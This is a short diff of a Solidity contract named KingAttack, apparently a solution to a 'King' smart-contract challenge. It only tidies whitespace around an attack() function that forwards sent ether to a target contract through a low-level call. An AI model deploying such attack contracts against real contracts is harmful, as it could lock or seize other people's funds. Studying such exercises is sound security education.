@@ -13,6 +13,5 @@ contract KingAttack {
     function attack() public payable returns (bool) {
         (bool result,) = kingContractAddress.call{value: msg.value}("");
         return result;
-    } 
-
+    }
 }
